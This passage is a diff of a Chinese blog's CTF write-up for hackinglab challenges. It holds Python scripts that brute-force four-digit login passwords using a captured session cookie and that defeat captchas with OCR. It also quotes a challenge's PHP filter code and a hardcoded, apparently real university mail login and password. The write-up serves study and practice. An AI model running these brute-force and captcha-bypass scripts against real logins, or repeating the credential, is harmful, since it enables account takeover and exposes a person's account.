-payload = {&#39;action:login&#39;:&#39;&#39;,&#39;uid&#39;:&#39;08133248&#39;,&#39;domain&#39;:&#39;cumt.edu.cn&#39;,&#39;nodetect&#39;:&#39;false&#39;,&#39;password&#39;:&#39;wattcswh&#39;,&#39;locale&#39;:&#39;zh_CN&#39;}
-header = {
-&quot;Host&quot;: &quot;mail.cumt.edu.cn&quot;,
-&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0&quot;,
-&quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;,
-&quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&quot;,
-&quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,
-&quot;Referer&quot;: &quot;http://acm.hdu.edu.cn/&quot;,
-&quot;Cookie&quot;: &quot;uid=08133248&quot;,
-&quot;Connection&quot;: &quot;keep-alive&quot;
-}
+payload <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'action:login'</span><span class="token punctuation">:</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">'uid'</span><span class="token punctuation">:</span><span class="token string">'08133248'</span><span class="token punctuation">,</span><span class="token string">'domain'</span><span class="token punctuation">:</span><span class="token string">'cumt.edu.cn'</span><span class="token punctuation">,</span><span class="token string">'nodetect'</span><span class="token punctuation">:</span><span class="token string">'false'</span><span class="token punctuation">,</span><span class="token string">'password'</span><span class="token punctuation">:</span><span class="token string">'wattcswh'</span><span class="token punctuation">,</span><span class="token string">'locale'</span><span class="token punctuation">:</span><span class="token string">'zh_CN'</span><span class="token punctuation">}</span>
+header <span class="token operator">=</span> <span class="token punctuation">{</span>
+<span class="token string">"Host"</span><span class="token punctuation">:</span> <span class="token string">"mail.cumt.edu.cn"</span><span class="token punctuation">,</span>
+<span class="token string">"User-Agent"</span><span class="token punctuation">:</span><span class="token string">"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0"</span><span class="token punctuation">,</span>
+<span class="token string">"Accept"</span><span class="token punctuation">:</span> <span class="token string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span><span class="token punctuation">,</span>
+<span class="token string">"Accept-Language"</span><span class="token punctuation">:</span> <span class="token string">"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3"</span><span class="token punctuation">,</span>
+<span class="token string">"Accept-Encoding"</span><span class="token punctuation">:</span> <span class="token string">"gzip, deflate"</span><span class="token punctuation">,</span>
+<span class="token string">"Referer"</span><span class="token punctuation">:</span> <span class="token string">"http://acm.hdu.edu.cn/"</span><span class="token punctuation">,</span>
+<span class="token string">"Cookie"</span><span class="token punctuation">:</span> <span class="token string">"uid=08133248"</span><span class="token punctuation">,</span>
+<span class="token string">"Connection"</span><span class="token punctuation">:</span> <span class="token string">"keep-alive"</span>
+<span class="token punctuation">}</span>
 
-s = requests.Session()
-r = s.post(&#39;http://mail.cumt.edu.cn/coremail/index.jsp&#39;,data=payload,headers=header)
-print r.status_code</code></pre><p>cookie的信息需要先通过抓包来获取</p>
+s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
+r <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'http://mail.cumt.edu.cn/coremail/index.jsp'</span><span class="token punctuation">,</span>data<span class="token operator">=</span>payload<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">)</span>
+<span class="token keyword">print</span> r<span class="token punctuation">.</span>status_code<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>cookie的信息需要先通过抓包来获取</p>
 <p>脚本分析：</p>
-<pre><code># -*- coding : utf-8 -*-
-import requests
-import re   #正则表达式
+<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding : utf-8 -*-</span>
+<span class="token keyword">import</span> requests
+<span class="token keyword">import</span> re   <span class="token comment" spellcheck="true">#正则表达式</span>
 
-url = &#39;http://lab1.xseclab.com/xss2_0d557e6d2a4ac08b749b61473a075be1/index.php&#39;
+url <span class="token operator">=</span> <span class="token string">'http://lab1.xseclab.com/xss2_0d557e6d2a4ac08b749b61473a075be1/index.php'</span>
 
-head = {&#39;Cookie&#39;: &#39;PHPSESSID=98db957833ad06f20d20765aed472328&#39;}
+head <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'Cookie'</span><span class="token punctuation">:</span> <span class="token string">'PHPSESSID=98db957833ad06f20d20765aed472328'</span><span class="token punctuation">}</span>
 
-source = requests.get(url, headers=head).content.decode(&#39;utf-8&#39;)
-expression = re.search(r&#39;(\d+[+*])+(\d+[+*])+\((\d+[+*])+(\d+)\)&#39;, source).group()
-print(expression)
-val = str(eval(expression))
-print(val)
-post = {&#39;v&#39;: val}
-result = requests.post(url, headers=head, data=post).content.decode(&#39;utf-8&#39;)
-print(result)
-</code></pre><p>让脚本带着cookie值，以便于用户访问页面的时候进行身份验证。</p>
+source <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>head<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
+expression <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>r<span class="token string">'(\d+[+*])+(\d+[+*])+\((\d+[+*])+(\d+)\)'</span><span class="token punctuation">,</span> source<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>expression<span class="token punctuation">)</span>
+val <span class="token operator">=</span> str<span class="token punctuation">(</span>eval<span class="token punctuation">(</span>expression<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span>
+post <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'v'</span><span class="token punctuation">:</span> val<span class="token punctuation">}</span>
+result <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>head<span class="token punctuation">,</span> data<span class="token operator">=</span>post<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>让脚本带着cookie值，以便于用户访问页面的时候进行身份验证。</p>
 <p>重要的是后面的赋值给r2，r3的代码不理解，还是需要学python才行</p>
 <h2 id="怎么就是不弹出key呢？"><a href="#怎么就是不弹出key呢？" class="headerlink" title="怎么就是不弹出key呢？"></a>怎么就是不弹出key呢？</h2><p>在<script>标签中，存在三个扰乱的函数return false；删除前三个函数，在本地重新执行代码（注：需有phpstudy环境支持），得到弹窗，截取前十四位字符，即为key：slakfjteslkjsd</p>
 <h2 id="逗比验证码第一期"><a href="#逗比验证码第一期" class="headerlink" title="逗比验证码第一期"></a>逗比验证码第一期</h2><p>hint：进入登陆页面后，User信息已给出，密码提示为：<strong>第一位不为0的4位纯数字</strong>，但需要输入验证码登陆。</p>
 <p>这是怎么个验证码漏洞：验证码的生成与cookie有关，所以脚本要围绕着cookie值来写</p>
-<pre><code># -*- coding : utf-8 -*-
-import requests
+<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding : utf-8 -*-</span>
+<span class="token keyword">import</span> requests
 
-url = &#39;http://lab1.xseclab.com/vcode1_bcfef7eacf7badc64aaf18844cdb1c46/login.php&#39;
+url <span class="token operator">=</span> <span class="token string">'http://lab1.xseclab.com/vcode1_bcfef7eacf7badc64aaf18844cdb1c46/login.php'</span>
 
-for password in range(1000, 9999):
-    head = {&#39;Cookie&#39;: &#39;PHPSESSID=98db957833ad06f20d20765aed472328&#39;}
-    post = {&#39;username&#39;: &#39;admin&#39;, &#39;pwd&#39;: password, &#39;vcode&#39;: &#39;ws2b&#39;, &#39;submit&#39;: &#39;submit&#39;}
-    result = requests.post(url, headers=head, data=post).text
-    print(password)
-    if len(result) != 9:
-     print(&quot;The passowrd is : &quot;+str(password))
-     print(result)
-     break</code></pre><p>同样，既然是通过bp抓包获得的cookie，那么直接在bp里面爆破就行：1238</p>
+<span class="token keyword">for</span> password <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    head <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'Cookie'</span><span class="token punctuation">:</span> <span class="token string">'PHPSESSID=98db957833ad06f20d20765aed472328'</span><span class="token punctuation">}</span>
+    post <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'admin'</span><span class="token punctuation">,</span> <span class="token string">'pwd'</span><span class="token punctuation">:</span> password<span class="token punctuation">,</span> <span class="token string">'vcode'</span><span class="token punctuation">:</span> <span class="token string">'ws2b'</span><span class="token punctuation">,</span> <span class="token string">'submit'</span><span class="token punctuation">:</span> <span class="token string">'submit'</span><span class="token punctuation">}</span>
+    result <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>head<span class="token punctuation">,</span> data<span class="token operator">=</span>post<span class="token punctuation">)</span><span class="token punctuation">.</span>text
+    <span class="token keyword">print</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> len<span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">9</span><span class="token punctuation">:</span>
+     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"The passowrd is : "</span><span class="token operator">+</span>str<span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">)</span>
+     <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
+     <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>同样，既然是通过bp抓包获得的cookie，那么直接在bp里面爆破就行：1238</p>
 <h2 id="逗比验证码第二期"><a href="#逗比验证码第二期" class="headerlink" title="逗比验证码第二期"></a>逗比验证码第二期</h2><p>hint：验证便失效的验证码</p>
 <p>当验证码为空时可以实现爆破</p>
 <h2 id="逗比的验证码第三期（SESSION）"><a href="#逗比的验证码第三期（SESSION）" class="headerlink" title="逗比的验证码第三期（SESSION）"></a>逗比的验证码第三期（SESSION）</h2><p>Tips:密码是4位数字，首位不是0<br>Tips2: SESSION</p>
 <p>与第二期无异</p>
 <h2 id="微笑一下就能过关"><a href="#微笑一下就能过关" class="headerlink" title="微笑一下就能过关"></a>微笑一下就能过关</h2><p>查看文件源代码：</p>
-<pre><code>&lt;?php  
-    header(&quot;Content-type: text/html; charset=utf-8&quot;);
-    if (isset($_GET[&#39;view-source&#39;])) { 
-        show_source(__FILE__); 
-        exit(); 
-    } 
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>  
+    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-type: text/html; charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'view-source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
+        <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+    <span class="token punctuation">}</span> 
 
-    include(&#39;flag.php&#39;); 
+    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
 
-    $smile = 1;  
+    <span class="token variable">$smile</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  
 
-   if (!isset ($_GET[&#39;^_^&#39;])) $smile = 0;  
-    if (preg_match (&#39;/\./&#39;, $_GET[&#39;^_^&#39;])) $smile = 0;  
-    /**格式：&#39;//&#39;
-     * \的作用是将.进行转义使在&#39;&#39;中能被转义出来
-    */
-    if (preg_match (&#39;/%/&#39;, $_GET[&#39;^_^&#39;])) $smile = 0;  
-    if (preg_match (&#39;/[0-9]/&#39;, $_GET[&#39;^_^&#39;])) $smile = 0;  
-    if (preg_match (&#39;/http/&#39;, $_GET[&#39;^_^&#39;]) ) $smile = 0;  
-    if (preg_match (&#39;/https/&#39;, $_GET[&#39;^_^&#39;]) ) $smile = 0;  
-    if (preg_match (&#39;/ftp/&#39;, $_GET[&#39;^_^&#39;])) $smile = 0;  
-    if (preg_match (&#39;/telnet/&#39;, $_GET[&#39;^_^&#39;])) $smile = 0;  
-    if (preg_match (&#39;/_/&#39;, $_SERVER[&#39;QUERY_STRING&#39;])) $smile = 0; 
-    if ($smile) { 
-        if (@file_exists ($_GET[&#39;^_^&#39;])) $smile = 0;  
-    }  
-    if ($smile) { 
-        $smile = @file_get_contents ($_GET[&#39;^_^&#39;]);  
-        if ($smile === &quot;(●&#39;◡&#39;●)&quot;) die($flag);  
-    }  
-?&gt;  </code></pre><p>file_get_contents() 函数把整个文件一次性读入一个字符串中。</p>
+   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'^_^'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token variable">$smile</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span> <span class="token punctuation">(</span><span class="token string">'/\./'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'^_^'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token variable">$smile</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  
+    <span class="token comment" spellcheck="true">/**格式：'//'
+     * \的作用是将.进行转义使在''中能被转义出来
+    */</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span> <span class="token punctuation">(</span><span class="token string">'/%/'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'^_^'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token variable">$smile</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span> <span class="token punctuation">(</span><span class="token string">'/[0-9]/'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'^_^'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token variable">$smile</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span> <span class="token punctuation">(</span><span class="token string">'/http/'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'^_^'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token variable">$smile</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span> <span class="token punctuation">(</span><span class="token string">'/https/'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'^_^'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token variable">$smile</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span> <span class="token punctuation">(</span><span class="token string">'/ftp/'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'^_^'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token variable">$smile</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span> <span class="token punctuation">(</span><span class="token string">'/telnet/'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'^_^'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token variable">$smile</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span> <span class="token punctuation">(</span><span class="token string">'/_/'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token variable">$smile</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> 
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$smile</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>@<span class="token function">file_exists</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'^_^'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token variable">$smile</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  
+    <span class="token punctuation">}</span>  
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$smile</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
+        <span class="token variable">$smile</span> <span class="token operator">=</span> @<span class="token function">file_get_contents</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'^_^'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$smile</span> <span class="token operator">===</span> <span class="token string">"(●'◡'●)"</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+    <span class="token punctuation">}</span>  
+<span class="token delimiter">?></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>file_get_contents() 函数把整个文件一次性读入一个字符串中。</p>
 <p>例子：</p>
-<pre><code>&lt;?php
-echo file_get_contents(&quot;test.txt&quot;);?&gt;
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span>
 输出：
 
-This is a test file with test text.
-PHP Filesystem 函数
+This is a test file with test text<span class="token punctuation">.</span>
+<span class="token constant">PHP</span> Filesystem 函数
 
-&lt;?php
+<span class="token delimiter">&lt;?php</span>
 
-//全国，判断条件是$REQUEST_URI是否含有html
+<span class="token comment" spellcheck="true">//全国，判断条件是$REQUEST_URI是否含有html</span>
 
-if (!strpos($_SERVER[&quot;REQUEST_URI&quot;],&quot;.html&quot;))</code></pre><pre><code>1.必须对&quot;^_^&quot;赋值
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">"REQUEST_URI"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">".html"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre><code>1.必须对&quot;^_^&quot;赋值
 2.&quot;^_^&quot;的值不能有  .  %  [0-9]  http  https  ftp  telnet  这些东西
 3.$_SERVER[&#39;QUERY_STRING&#39;],即&quot;^_^=(输入的值)&quot;这个字符串不能有 _ 这个字符
 4.满足$smile!=0
@@ -1174,60 +1184,61 @@ $_GET[&#39;^_^&#39;]又必须不存在.所以$_GET[&#39;^_^&#39;]只能是字符
 <h2 id="验证码识别（未完成）"><a href="#验证码识别（未完成）" class="headerlink" title="验证码识别（未完成）"></a>验证码识别（未完成）</h2><p>Tips:验证码依然是3位数</p>
 <p>软件利用pkav</p>
 <p>脚本：需要安装tesseract-ocr模块，通过tesseract来识别验证码</p>
-<pre><code>import requests
-import re
-import pytesseract
-from PIL import Image
-import urllib.request
-import sys
+<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">import</span> re
+<span class="token keyword">import</span> pytesseract
+<span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image
+<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>request
+<span class="token keyword">import</span> sys
 
-s = requests.Session()
-url = &quot;http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/login.php&quot;
-head = {&#39;cookie&#39;: &#39;PHPSESSID=0a8197f36e6ab659fa5e0be5168b5b35&#39;}
-
-
-def main():
-    num = 100
-    while num &lt; 1000:
-        code = get_code()
-        get_url(num, code)
-        num += 1
+s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
+url <span class="token operator">=</span> <span class="token string">"http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/login.php"</span>
+head <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'cookie'</span><span class="token punctuation">:</span> <span class="token string">'PHPSESSID=0a8197f36e6ab659fa5e0be5168b5b35'</span><span class="token punctuation">}</span>
 
 
-def get_code():
-    urllib.request.urlretrieve(&#39;http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/vcode.php&#39;, &#39;1.png&#39;)
-    code = pytesseract.image_to_string(Image.open(&#39;1.png&#39;))
-    code = code.replace(&#39; &#39;, &#39;&#39;)
-    # print(code)
-    try:
-        if len(code) == 4:
-
-            print(&#39;验证码是&#39;, code)
-            return code
-            # print(code)
-        else:
-            print(&quot;重新获取验证码！&quot;)
-            get_code()
-
-    except UnicodeEncodeError:
-        pass
+<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    num <span class="token operator">=</span> <span class="token number">100</span>
+    <span class="token keyword">while</span> num <span class="token operator">&lt;</span> <span class="token number">1000</span><span class="token punctuation">:</span>
+        code <span class="token operator">=</span> get_code<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        get_url<span class="token punctuation">(</span>num<span class="token punctuation">,</span> code<span class="token punctuation">)</span>
+        num <span class="token operator">+=</span> <span class="token number">1</span>
 
 
-def get_url(num, code):
-    data = {&#39;username&#39;: &#39;13388886666&#39;, &#39;mobi_code&#39;: num, &#39;user_code&#39;: code, &#39;Login&#39;: &#39;submit&#39;}
-    res = s.post(url, data=data, headers=head).content.decode(&#39;utf-8&#39;)
+<span class="token keyword">def</span> <span class="token function">get_code</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlretrieve<span class="token punctuation">(</span><span class="token string">'http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/vcode.php'</span><span class="token punctuation">,</span> <span class="token string">'1.png'</span><span class="token punctuation">)</span>
+    code <span class="token operator">=</span> pytesseract<span class="token punctuation">.</span>image_to_string<span class="token punctuation">(</span>Image<span class="token punctuation">.</span>open<span class="token punctuation">(</span><span class="token string">'1.png'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    code <span class="token operator">=</span> code<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
+    <span class="token comment" spellcheck="true"># print(code)</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> len<span class="token punctuation">(</span>code<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span>
 
-    if u&#39;error&#39; not in res:
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'验证码是'</span><span class="token punctuation">,</span> code<span class="token punctuation">)</span>
+            <span class="token keyword">return</span> code
+            <span class="token comment" spellcheck="true"># print(code)</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"重新获取验证码！"</span><span class="token punctuation">)</span>
+            get_code<span class="token punctuation">(</span><span class="token punctuation">)</span>
 
-        print(res, &#39;密码是&#39;, num)
-        sys.exit()
-    else:
-        print(res, &#39;密码是&#39;, num, &#39;---错误&#39;)
-        # print(&quot;正在尝试...&quot;)
+    <span class="token keyword">except</span> UnicodeEncodeError<span class="token punctuation">:</span>
+        <span class="token keyword">pass</span>
 
 
-if __name__ == &#39;__main__&#39;:
-    main()</code></pre><h1 id="XSS关"><a href="#XSS关" class="headerlink" title="XSS关"></a>XSS关</h1><h2 id="XSS基础关"><a href="#XSS基础关" class="headerlink" title="XSS基础关"></a>XSS基础关</h2><p>XSS基础:很容易就可以过关.XSS类题目必须在平台登录才能进行.登录地址请参考左侧<子系统></p>
+<span class="token keyword">def</span> <span class="token function">get_url</span><span class="token punctuation">(</span>num<span class="token punctuation">,</span> code<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'13388886666'</span><span class="token punctuation">,</span> <span class="token string">'mobi_code'</span><span class="token punctuation">:</span> num<span class="token punctuation">,</span> <span class="token string">'user_code'</span><span class="token punctuation">:</span> code<span class="token punctuation">,</span> <span class="token string">'Login'</span><span class="token punctuation">:</span> <span class="token string">'submit'</span><span class="token punctuation">}</span>
+    res <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> headers<span class="token operator">=</span>head<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">if</span> u<span class="token string">'error'</span> <span class="token operator">not</span> <span class="token keyword">in</span> res<span class="token punctuation">:</span>
+
+        <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span> <span class="token string">'密码是'</span><span class="token punctuation">,</span> num<span class="token punctuation">)</span>
+        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span> <span class="token string">'密码是'</span><span class="token punctuation">,</span> num<span class="token punctuation">,</span> <span class="token string">'---错误'</span><span class="token punctuation">)</span>
+        <span class="token comment" spellcheck="true"># print("正在尝试...")</span>
+
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h1 id="XSS关"><a href="#XSS关" class="headerlink" title="XSS关"></a>XSS关</h1><h2 id="XSS基础关"><a href="#XSS基础关" class="headerlink" title="XSS基础关"></a>XSS基础关</h2><p>XSS基础:很容易就可以过关.XSS类题目必须在平台登录才能进行.登录地址请参考左侧<子系统></p>
 <p>payload：</p>
